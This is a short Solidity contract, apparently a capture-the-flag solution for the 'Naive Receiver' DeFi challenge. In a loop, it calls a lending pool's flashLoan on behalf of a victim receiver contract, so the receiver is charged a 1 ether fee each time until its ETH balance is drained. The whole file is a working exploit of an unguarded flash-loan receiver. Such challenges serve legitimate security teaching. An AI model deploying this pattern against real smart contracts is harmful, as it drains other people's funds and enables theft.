// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract AttackNaiveReceiver {

    NaiveReceiverLenderPool private pool;
    IERC3156FlashBorrower private receiver;

    constructor(address payable _pool, address payable _receiver) {
        pool = NaiveReceiverLenderPool(_pool);
        receiver = IERC3156FlashBorrower(_receiver);
    }

    function attack() external {
        uint256 fee = 1 ether;
        while (address(receiver).balance >= fee) {
            pool.flashLoan(receiver, pool.ETH(), 10 ether, "0x");
        }
    }
}